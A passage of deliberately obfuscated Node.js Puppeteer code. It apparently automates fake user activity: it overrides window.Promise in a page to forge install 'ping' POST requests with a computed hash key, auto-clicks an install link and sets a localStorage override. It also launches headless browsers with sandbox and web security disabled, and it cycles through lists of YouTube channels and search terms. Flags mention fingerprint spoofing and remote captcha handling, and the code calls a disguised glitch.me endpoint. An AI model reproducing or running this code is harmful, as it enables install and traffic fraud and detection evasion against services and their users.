-0x1 * 0x1da5 | L >> 0x16fa + 0x186e + 0xe * -0x362 & 0xe3 + 0x94a + -0x9ee) << y[0x1eda + 0x12d7 + -0x31ae & N++], P[N >> -0x1 * 0x2446 + -0x2d5 * -0x5 + 0x1 * 0x161f] |= (-0x1 * 0x62b + 0x10f2 + -0xa47 | L >> 0x1 * 0x11d1 + 0x1 * 0x4ba + -0x1685 & -0x1 * 0xa9e + -0x18fe + 0x43 * 0x89) << y[-0x63c + 0x214c + 0x569 * -0x5 & N++], P[N >> -0xf * -0x15d + 0x1a * 0x151 + -0x36ab] |= (0x1bd1 + -0x4ff + -0x1652 * 0x1 | -0x392 * -0x8 + -0x2063 + -0x2 * -0x209 & L) << y[0x25d8 + -0x4 * -0x1e8 + 0x1 * -0x2d75 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x773 * 0x1 + -0x39 * -0x68 + -0x1e5b ? (this['block'] = P[0x5cb + 0x2 * -0x81a + 0xa79], this['start'] = N - (0x62b + -0x2179 + 0x1b8e * 0x1), this['hash'](), this['hashed'] = 0x23d5 + -0x132e * 0x2 + 0x288) : this['start'] = N;
                }
                return this['bytes'] > 0xdba9f3ef + -0x183a1 * 0xebd3 + 0xc2ce27 * 0x205 && (this['hBytes'] += this['bytes'] / (-0xaeebd174 + -0x2f0d36b4 + 0x1ddf90828) << 0x58d * 0x5 + -0x1 * 0x1aa5 + -0x4 * 0x47, this['bytes'] = this['bytes'] % (0x2ec * -0x43a3ee + 0x187e9643c + 0x3db9972c)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x1e0e + -0x1 * 0x412 + 0x3 * -0x8a9;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x633 * 0x1 + 0xb19 + 0x4 * -0x44f] = this['block'], J[K >> 0x1ce4 + -0x19 * -0xf5 + -0xb * 0x4cd] |= x[0x1 * 0xfac + -0x31 * -0x19 + -0x1472 & K], this['block'] = J[-0x25 * -0x11 + 0x1 * -0x13af + 0x114a], K >= 0x13a1 + 0x2105 * 0x1 + -0x117a * 0x3 && (this['hashed'] || this['hash'](), J[-0x1efd + -0x51 * 0x4 + 0x2041] = this['block'], J[0x90c + -0x2342 + 0x1a46] = J[0x1e17 + 0xf * 0x1b7 + 0x44b * -0xd] = J[-0x1355 + 0x17ae + -0x457 * 0x1] = J[0x120e + 0x1d65 + -0x170 * 0x21] = J[-0x1872 * 0x1 + 0x2a5 + -0x5 * -0x45d] = J[-0x1 * 0xa4d + 0x1a7b + 0x1029 * -0x1] = J[0x1c0 + 0x9b2 + 0x5b6 * -0x2] = J[0x53 * -0x5 + -0x2 * 0x6d + 0x280] = J[-0xf08 + 0x14b8 + -0x5a8] = J[0x19f9 + -0x3d7 * -0x6 + -0x30fa] = J[0xd * -0xa3 + 0x4 * -0x5cc + 0x1f81] = J[0x1 * -0xc5e + -0x1 * -0xb57 + 0x112] = J[-0x25 * -0xc1 + -0xa9 * -0x3 + -0xeea * 0x2] = J[-0x1 * 0x14f6 + 0x205 * 0x1 + -0x8f * -0x22] = J[0x2 * -0x967 + -0xd6f + 0x7 * 0x49d] = J[-0x2397 * -0x1 + -0x2486 + 0x2 * 0x7f] = 0xe2f + -0x35b * 0x2 + -0x779), J[-0x10af * -0x1 + -0x267 * -0x10 + -0x3711] = this['hBytes'] << -0xd1a * -0x1 + -0x70f + -0x608 | this['bytes'] >>> -0x8 + 0xa95 * -0x3 + 0x1fe4, J[-0x23ab * 0x1 + -0x6 * -0xe3 + -0x3cd * -0x8] = this['bytes'] << -0x11e7 + 0x1283 + -0x99, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x1fd8 + -0x75e + 0x2 * -0xc35; J < 0x1e28 + -0xec3 * -0x2 + -0x3b5e; ++J)
                K = Q[J - (0x776 + 0x25c8 + -0x2d3b)] ^ Q[J - (0x1881 + 0x1 * 0x20a + 0x1 * -0x1a83)] ^ Q[J - (0x2f2 + -0x1f57 + 0x1c73 * 0x1)] ^ Q[J - (-0x167 + 0x231e + -0x21a7)], Q[J] = K << -0x1885 + -0x1 * -0x1805 + 0x81 | K >>> -0x116c + -0x115d + 0x22e8;
              for (J = 0x1 * -0x1cc3 + 0x1348 + -0x97b * -0x1; J < 0x1815 + -0x2450 * -0x1 + -0x1 * 0x3c51; J += 0x1 * 0xbd6 + -0x1 * 0x2381 + 0x17b0)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0xc3c + -0x9 * -0x17b + 0x2 * -0x89 | L >>> 0x5 * -0x3b + -0x13ba + -0x4 * -0x53f) + (M & N | ~M & O) + P + (0x5fc1 * 0x198fa + -0x9f77426f + -0x136686b6 * -0x5) + Q[J] << 0x103f * 0x1 + -0xe69 + -0x1d6) << 0xb5a + 0x1c54 + -0x27a9 | P >>> -0x58 * -0x39 + -0x3fe * -0x8 + -0x5 * 0xa49) + (L & (M = M << 0x1 * 0xc6d + 0x6 * 0x3e4 + -0x23a7 | M >>> -0x1e77 + -0x23d3 + -0x4 * -0x1093) | ~L & N) + O + (-0x1 * 0x2b54a767 + 0xa111227d + 0x1b3a017d * -0x1) + Q[J + (-0x1 * -0x1073 + -0xf * -0xe6 + 0xa * -0x2fe)] << 0xe9c + 0x5 * -0x1fc + -0x4b0) << -0x242a + 0x16e9 + -0xd46 * -0x1 | O >>> -0x117e + 0x644 * 0x5 + -0xdbb) + (P & (L = L << 0x217c * -0x1 + -0x216f + 0x4309 | L >>> -0x1 * 0x2351 + -0x6b * -0x2f + 0xfae) | ~P & M) + N + (-0x1834 * 0x679de + -0x6e170b62 + -0x165571613 * -0x1) + Q[J + (-0x1 * 0xa89 + -0x1 * 0x16b4 + 0x1 * 0x213f)] << 0x84c + 0x5 * 0x3c7 + -0x1b2f) << 0x1b38 + 0xd63 + 0x40f * -0xa | N >>> 0x1a44 + -0x27 * 0xf1 + -0xe * -0xc1) + (O & (P = P << 0xf56 * -0x2 + 0x665 * -0x1 + 0x252f | P >>> -0x5 * 0x3fa + 0x1 * 0xc0e + 0x7d6) | ~O & L) + M + (-0x699d892e + -0x43f17487 * -0x2 + 0x3c3d19b9) + Q[J + (-0x18e5 * 0x1 + 0x25 * 0x12 + -0x164e * -0x1)] << 0x23f5 * 0x1 + 0x7 * -0x1c1 + -0x7 * 0x362) << 0x3 * 0x649 + -0xe7c * -0x2 + -0x2fce | M >>> 0x1 * 0x22a7 + -0x1789 + -0xb03) + (N & (O = O << -0x1006 + -0x10f4 + 0x2118 | O >>> -0x157c + 0x1d82 + -0x804) | ~N & P) + L + (0x994f06c9 + 0x1619553b * 0x3 + -0x81188ce1) + Q[J + (0x7ed + 0x83 * -0x13 + 0x1d0)] << -0x19ae + 0x2337 + -0x989 * 0x1, N = N << -0x12ca + 0x86 * -0x1d + 0x1 * 0x2216 | N >>> -0x15 * -0x18c + 0x1978 + -0x39f2;
              for (; J < 0x9ff * -0x2 + 0x17db + -0xd * 0x49; J += 0x93c + 0x1369 + -0x1ca0)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0xd6 * 0x16 + 0x1802 + -0x599 | L >>> 0x3 * -0x617 + 0xabd + 0x7a3) + (M ^ N ^ O) + P + (0xdca2a126 + -0xd1d6c4c5 + 0x26 * 0x2a20de0) + Q[J] << 0x162e + 0x1e1d + -0x344b) << 0x263b + 0x1 * 0xfd1 + -0x3607 | P >>> -0x1a96 + 0x53c + 0x1575) + (L ^ (M = M << 0x250e + -0x1628 + -0x58 * 0x2b | M >>> -0x15e4 + 0x1258 * -0x2 + 0x3a96) ^ N) + O + (0x3459afd * -0xe + 0x5 * 0x123b517e + 0xedb9 * 0x4689) + Q[J + (0x18b1 + 0x2 * -0x54f + 0xe12 * -0x1)] << -0xe1f + -0xac9 * 0x3 + 0x2e7a * 0x1) << 0xec * -0x11 + 0x1 * -0x103d + -0x1fee * -0x1 | O >>> 0x1b88 + 0x3e + 0x939 * -0x3) + (P ^ (L = L << -0x703 + 0x64b * -0x3 + 0x2 * 0xd01 | L >>> -0x2b * -0x69 + 0xca * 0x2b + -0x338f) ^ M) + N + (0xc15c882 + -0x657d6cc4 + 0x1 * 0xc8418fe3) + Q[J + (0x669 + 0x4 * -0x26 + -0x5cf)] << 0x236 * 0xc + -0x1f * -0x5d + -0x25cb) << -0x2639 + 0x1d7b + -0x1 * -0x8c3 | N >>> 0x1 * 0x2042 + 0x1dc8 + -0x3def) + (O ^ (P = P << 0x131b + -0x230b * -0x1 + -0x3608 | P >>> -0x29a * 0xd + -0x2416 + 0x174e * 0x3) ^ L) + M + (0x1eb * 0x34e47b + -0xc13fdfb6 + 0xcaa7936e) + Q[J + (0x15f7 + 0x212a + 0xb06 * -0x5)] << -0xbff + 0xe85 + -0x1 * 0x286) << -0x241a * -0x1 + 0x28f + -0x26a4 | M >>> 0xe * 0x190 + -0x1fc6 + 0xa01) + (N ^ (O = O << -0x1 * -0x48b + -0x22c5 + 0x1e58 | O >>> -0x32 * 0x35 + -0x4fd * -0x2 + 0x62) ^ P) + L + (0x1 * -0x1a65ede4 + 0x380b * -0x3138b + -0x36b2 * -0x5a957) + Q[J + (-0x231e + 0x8f3 + -0x1a2f * -0x1)] << 0x5f * -0x22 + -0x9 * -0x364 + -0x11e6, N = N << 0x263b * 0x1 + -0x2649 + 0x2c | N >>> 0x668 * 0x5 + 0xeb7 + -0x5 * 0x959;
              for (; J < 0x8a * -0x1 + 0x1 * -0x687 + 0x74d; J += -0x11b * 0x1f + -0x1ee * -0x2 + -0x1 * -0x1e6e)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * 0xd46 + 0x1 * -0x2110 + 0x13cf * 0x1 | L >>> 0x158b + 0x1d0d + -0x205 * 0x19) + (M & N | M & O | N & O) + P - (0x7bde487d + -0x781a63db + 0xdee * 0x7d587) + Q[J] << 0xdcf + 0x2c * -0x68 + -0x1 * -0x411) << 0xc55 * 0x3 + -0x1bd2 + 0x4 * -0x24a | P >>> -0x4e9 + -0x2 * -0xfd3 + 0x1e7 * -0xe) + (L & (M = M << 0xb8b + -0xdd6 + 0x269 * 0x1 | M >>> 0x8b * 0x32 + 0x1aba + -0x7 * 0x7b2) | L & N | M & N) + O - (0x267a9e36 + 0xb2163ce2 + -0x67ac97f4) + Q[J + (-0x41 * -0x8b + -0x5 * -0x3ad + -0x35ab)] << -0x614 + 0x110 * 0x9 + 0x1be * -0x2) << -0x1dcd + -0x1 * -0x16d4 + 0x166 * 0x5 | O >>> -0xf6d + -0xbad * 0x1 + 0x1b35) + (P & (L = L << 0x1f * 0xf + -0x1fa4 + -0x1ff * -0xf | L >>> -0x5d * -0x40 + 0x220b + 0xb75 * -0x5) | P & M | L & M) + N - (0x38b8f8fd + 0xdcaeed3f + -0xa483a318 * 0x1) + Q[J + (-0x2624 + 0x1dc5 + 0x5 * 0x1ad)] << -0x2f5 + -0x21a * -0x4 + -0x573) << -0x1174 + -0x1b77 + 0x2cf0 | N >>> -0x25f3 + -0x150b * -0x1 + 0x1103) + (O & (P = P << -0x1da7 * -0x1 + -0x152f + -0x42d * 0x2 | P >>> -0x3 * 0x613 + -0x28 + 0x1263) | O & L | P & L) + M - (0xda8a30a3 + 0x7f18f4a7 + -0xe8bee226) + Q[J + (0x1 * -0x68b + -0x4c5 + 0xb53)] << 0x226d + 0x12ab + -0x3518) << -0x13e1 + 0x3 * 0x64f + -0x53 * -0x3 | M >>> -0xdf4 + -0x2 * 0x641 + 0x8db * 0x3) + (N & (O = O << -0x1c02 + -0x1 * 0xabb + 0x1 * 0x26db | O >>> 0x1fe7 * -0x1 + 0x129e * 0x1 + -0x29 * -0x53) | N & P | O & P) + L - (-0x5 * -0x16055966 + -0x61fb31c0 + 0x7d26 * 0xce21) + Q[J + (0x278 * -0x8 + -0x676 + -0x2 * -0xd1d)] << -0x21c9 + -0xe79 + 0x3042, N = N << -0x1db7 + 0x1697 + 0x73e | N >>> -0x1 * -0x242f + 0x21 * 0xf + -0x261c;
              for (; J < -0x49 + 0x16cd + -0x1634; J += 0x1e54 + -0xd0d * -0x1 + -0x2b5c)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x4 * 0x42f + -0x1965 + 0x8ae | L >>> -0x223a + 0x1d * 0x9a + 0x10e3) + (M ^ N ^ O) + P - (-0x2 * 0xa68ad11 + 0x1 * 0x18e3801b + 0x1805611 * 0x21) + Q[J] << 0x64 * 0x31 + 0x2 * -0xcbe + 0x658) << -0x1e * -0xf0 + 0x22fd + 0x4 * -0xfc6 | P >>> 0xeae * -0x1 + -0xfb6 + 0x25 * 0xd3) + (L ^ (M = M << 0x2430 + -0xbb3 * 0x1 + -0x185f * 0x1 | M >>> 0x2e5 + 0x9bf * -0x2 + 0x27 * 0x6d) ^ N) + O - (0xe5 * -0x6a904a + -0xa49 * -0x769d7 + 0x48b0bc0d) + Q[J + (-0x84f + 0x1d3 * 0x5 + -0xcf)] << -0x228a + 0xc * -0x337 + -0x62 * -0xbf) << 0xbaf * 0x1 + 0x1a3e + -0x25e8 | O >>> -0x1232 + 0xb95 * 0x2 + -0xf * 0x53) + (P ^ (L = L << -0x1 * 0x761 + -0x25af + 0x2d2e | L >>> -0x195c + -0x2142 * -0x1 + 0x2 * -0x3f2) ^ M) + N - (0x56e600ea * -0x1 + 0xb * -0x6f0d963 + 0xd8dc9655) + Q[J + (0x1144 + 0xc2 + -0x481 * 0x4)] << -0x4 * 0x41f + 0x252 + -0x2 * -0x715) << 0x265 + 0x2427 + -0x2687 * 0x1 | N >>> 0x1741 * 0x1 + -0x212f + 0xa09) + (O ^ (P = P << 0x18a4 + 0x914 + -0x219a | P >>> 0x70e + 0x157d + -0x1 * 0x1c89) ^ L) + M - (0x50976ad8 + -0x2729ed * 0x59 + -0xd5c9949) + Q[J + (-0x1645 + 0x15fd + 0x4b)] << -0x1023 + 0x135 * -0x19 + 0x2 * 0x1728) << -0x433 * -0x7 + -0x60d + 0x7 * -0x355 | M >>> -0x26 * -0xed + 0xc5 * 0x11 + -0x3028) + (N ^ (O = O << 0x31 * 0xa3 + -0x5db + 0x2 * -0xc9d | O >>> -0xa21 * -0x1 + -0xc50 + 0x231) ^ P) + L - (-0x5d84904e + -0x1a6eaa1d + 0xad907895) + Q[J + (0x1 * -0x5e2 + 0x1371 + -0xd8b)] << 0x1241 * 0x1 + 0xc5 * -0x1a + 0x1c1, N = N << -0xfc5 + -0x4 * -0xc + 0xfb3 * 0x1 | N >>> -0x230f + -0x15a5 * 0x1 + 0x38b6;
              this['h0'] = this['h0'] + L << -0x1cdb * -0x1 + 0x254d + -0x2 * 0x2114, this['h1'] = this['h1'] + M << 0x1a2 * -0xb + -0x3e * -0x11 + 0xdd8, this['h2'] = this['h2'] + N << 0x1fcc + 0x16 * 0x165 + -0x3e7a, this['h3'] = this['h3'] + O << -0x8d * -0x42 + 0x25da + -0x4a34, this['h4'] = this['h4'] + P << 0x1908 + -0x8 * 0x34 + 0x2 * -0xbb4;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x1503 + -0xb * 0x253 + 0x4aa & -0x21af * -0x1 + 0x746 + -0x28e6] + w[J >> 0x1ab * -0x1 + 0x1893 + -0x16d0 & -0x1611 + -0x1 * 0x2308 + 0x3928] + w[J >> -0xb * -0x251 + -0xad3 + 0x26e * -0x6 & -0xc06 + 0x1842 + 0x1 * -0xc2d] + w[J >> -0x1125 + 0x18be + -0x3 * 0x283 & 0x9eb * 0x2 + -0x2544 + 0x117d] + w[J >> -0x498 + 0x1c52 + -0x17ae & 0x1 * 0xf0f + -0x1 * 0x1f85 + 0x1085] + w[J >> -0x243b + -0x13 * 0x8b + 0x2e94 & -0x12f2 * 0x1 + 0x56 * -0x58 + -0x1 * -0x3091] + w[J >> 0x6 * 0x1d + -0x117d + 0x10d3 & 0x1 * 0x1273 + 0xb3 * 0x31 + -0x34a7] + w[0x67d + 0x175 * 0x11 + 0xa3 * -0x31 & J] + w[K >> 0x7 * 0x4f5 + 0x271 * -0xd + 0x2 * -0x16d & -0x179f * -0x1 + 0x223 * 0x11 + 0x1 * -0x3be3] + w[K >> 0x4 * 0x8e6 + -0xee6 + -0x149a & -0x1e * 0xa5 + 0x371 * -0x2 + 0x1a47] + w[K >> -0x5 * -0x2ef + 0x6 * -0x3e4 + 0x8c1 & 0xb87 * -0x1 + -0x1 * -0x1af5 + -0xf5f] + w[K >> -0x8b * 0x12 + -0x1416 + 0x1dec & -0x1 * 0xcdc + -0x9 * 0x24b + -0x1 * -0x218e] + w[K >> -0x4 * -0x563 + 0xbc9 + -0x2149 * 0x1 & -0x133c + 0x1dd0 + -0x1 * 0xa85] + w[K >> 0x9f7 * -0x3 + 0x199d + 0x450 & 0x8 * -0x139 + -0x1e89 + 0x2860] + w[K >> -0x1925 + 0x2584 + -0xc5b & 0x1 * 0x1d1d + 0x12bd + 0x2fcb * -0x1] + w[-0x15ca + -0x567 + -0x2 * -0xda0 & K] + w[L >> 0x1 * 0x1241 + 0x212e + 0x3353 * -0x1 & -0x13eb + 0x2 * 0xdc9 + 0x4 * -0x1e6] + w[L >> -0x181d + 0x1 * 0x2a2 + 0x1593 & -0x216b + -0x1513 + 0x18f * 0x23] + w[L >> -0x8 * -0x319 + -0x189d + 0x17 * -0x1 & 0xaec + -0x219d + 0x16c0] + w[L >> 0x1be8 + 0x6e0 + 0x58 * -0x65 & -0x1 * 0x19b5 + 0x21dc + -0x818] + w[L >> 0xa50 + 0x98d + -0x13d1 & -0x233f + 0x2 * -0x1337 + 0x49bc] + w[L >> -0x21ac + -0x268a + 0x483e & -0x2342 + -0xd * -0xb9 + -0xcf6 * -0x2] + w[L >> -0x778 + -0x21d * -0xb + -0xfc3 & 0xbc8 + 0x16b0 + -0x2269 * 0x1] + w[-0x328 + -0x2214 + 0x254b & L] + w[M >> -0x78c + 0x14d2 + 0x695 * -0x2 & 0x8cb * 0x1 + -0x1 * 0x16c3 + 0xe07] + w[M >> -0x10b4 + -0xc4f + 0x1d1b & 0x61 * 0xe + -0x283 * 0xe + 0x6f * 0x45] + w[M >> 0x2199 + -0x10b2 + -0x49 * 0x3b & -0x100 * 0x16 + -0x20c8 + 0x36d7] + w[M >> -0x185 + 0x1 * -0x599 + 0x72e & 0x161 + -0x8 * 0x1c1 + -0x1 * -0xcb6] + w[M >> 0x1c03 * 0x1 + 0x1 * 0xe64 + -0x2a5b * 0x1 & -0x19dd + 0x10 * -0x10a + 0x2a8c] + w[M >> 0x4dc * 0x2 + -0x11 + -0x99f & -0x249 + 0x877 + -0x61f] + w[M >> 0x1 * 0xd2d + 0xdb8 + -0x3d7 * 0x7 & -0x6f3 * -0x1 + -0x18f0 + 0x16 * 0xd2] + w[0x17c3 + 0x1 * 0x1374 + -0x8 * 0x565 & M] + w[N >> -0x3 * -0x33c + -0x13b * -0x1 + 0x1 * -0xad3 & 0x21f6 + -0x13c + -0x20ab] + w[N >> -0x2 * 0xeed + -0x3 * 0x733 + -0x75d * -0x7 & -0x1f0f + -0x1629 + 0x3547] + w[N >> 0x136 + 0x3 * 0x35f + -0xb3f & 0x7 * 0x16 + -0x564 + 0x11 * 0x49] + w[N >> -0xcba + 0x1b7d + -0xeb3 & -0x5 * 0x7a7 + -0x3 * 0x55e + 0x366c] + w[N >> 0x28f + -0x10f * 0x2 + -0x65 & 0x1 * -0x3fa + -0x4c5 * 0x6 + 0x20a7] + w[N >> -0x26f0 + -0x1 * -0x229f + -0x9f * -0x7 & -0x858 + 0x1567 + 0x1 * -0xd00] + w[N >> -0x5 * -0x67f + -0x1fa1 * 0x1 + -0xd6 * 0x1 & 0x4cd * -0x3 + -0x19be + 0x2834 * 0x1] + w[0xb48 * 0x1 + -0x1d64 + -0x1 * -0x122b & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x2dc * 0xd + -0x993 + -0x1b81 & -0x62 * -0xa + 0x9ce + -0xca3,
                J >> 0x1 * 0x6c5 + 0xab * 0x11 + -0x1210 & -0x142d + -0x2059 + 0x1 * 0x3585,
                J >> -0xb34 + 0x1724 + -0xbe8 & -0x1 * 0x201d + 0x35 * 0x75 + 0x8e3,
                -0x16a * -0x19 + 0x2a9 + 0x2504 * -0x1 & J,
                K >> 0xd93 * 0x1 + 0xe8 + -0x1d * 0x7f & 0x1 * -0x829 + -0x1b41 + -0x3 * -0xc23,
                K >> 0x1229 + -0x83c + -0x19 * 0x65 & 0x12d3 * 0x1 + 0xb5 * -0x4 + -0x2 * 0x780,
                K >> -0x8b8 + -0x1d8f + 0x264f & -0x1e29 + -0x16d9 + 0x3601,
                0x831 * -0x1 + 0x201c + -0x16ec & K,
                L >> -0x51d * 0x3 + -0xeb2 + 0x1e21 & -0x3 * -0xc75 + -0x17dd * 0x1 + -0xc83 * 0x1,
                L >> -0x103f + -0x1294 + 0x22e3 & 0x12f0 + 0x1ede + -0x30cf,
                L >> -0x1 * 0x2314 + 0x47 * 0x2f + 0x1613 & -0x1c1 * 0xa + -0x17d4 + -0x3 * -0xe1f,
                0x22 * 0x60 + -0x180c + 0x1 * 0xc4b & L,
                M >> 0x3a5 * -0x3 + -0x540 + 0x1047 & -0x3 * 0xb0b + -0x1d3 * 0x2 + 0x12e3 * 0x2,
                M >> -0x1 * 0x258a + -0x5 * 0x25c + -0x1 * -0x3166 & 0x216f + -0x1eab + -0x1c5,
                M >> -0x1ea3 + -0xd00 + 0x2bab & 0x2 * -0xb03 + 0x174b + -0x46,
                -0x18fc + 0x1854 + 0x1a7 * 0x1 & M,
                N >> 0x1541 * -0x1 + 0x2335 + -0xddc & 0x203b + -0x98f * 0x1 + 0x1 * -0x15ad,
                N >> -0x19 * -0x8e + -0x6f1 + 0x1 * -0x6dd & 0x1130 + 0x2206 + -0x3237,
                N >> -0x77f + 0xf7c * 0x2 + -0x1771 & -0x1f68 + 0xafc + 0x1 * 0x156b,
                -0x1 * 0x2047 + -0x2083 + -0x5fb * -0xb & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x1bc5 + 0x51 * 0x61 + -0x1 * 0x3a62), (K = new DataView(J))['setUint32'](-0x2273 + -0x5 * 0x3b + -0x28b * -0xe, this['h0']), K['setUint32'](-0x8dc + 0x1 * -0x4a9 + 0xd89, this['h1']), K['setUint32'](0x86c + -0x1f3c + 0xb6c * 0x2, this['h2']), K['setUint32'](-0x5ab * -0x2 + -0x1189 * 0x2 + 0xbe4 * 0x2, this['h3']), K['setUint32'](0x222 + -0x16a9 + 0x6dd * 0x3, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + U(0x3), '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x1427 + 0xc19 * -0x2 + 0x40b];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x1108 + -0x1 * -0xb2d + -0x1c35;
            J[-0x1 * -0x1661 + -0x1686 + -0x25 * -0x1]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x17ce * -0x1 + -0x1 * 0x5b3 + 0x1d81] = L => {
              const V = d;
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I[V(0xf) + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x71d * 0x5 + -0x1a2b + 0x3dbd), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x6df * -0x5 + 0x2 * 0xcc7 + -0x3be8;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x541 + -0x557 * 0x1 + 0x2f9 * 0x2), Promise['resolve'](0x1730 + 0x2ba * -0x1 + -0x1 * 0x1475);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x1b30 + -0x6d3 * -0x1 + -0x2203 * 0x1; j < -0xc76 + -0x13 * 0x15d + 0x265e; j++)
    i();
}
const NETWORK_PATIENCE = 0xd27 + -0x3cf5 + 0x4f0e + (-0x16fc + 0x1ad * -0x13 + 0x428b) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x1f * 0x22 + 0x1 * 0x9e0 + -0x5bf) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x1 * -0xc1d + -0xbcd + 0x17ea; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + 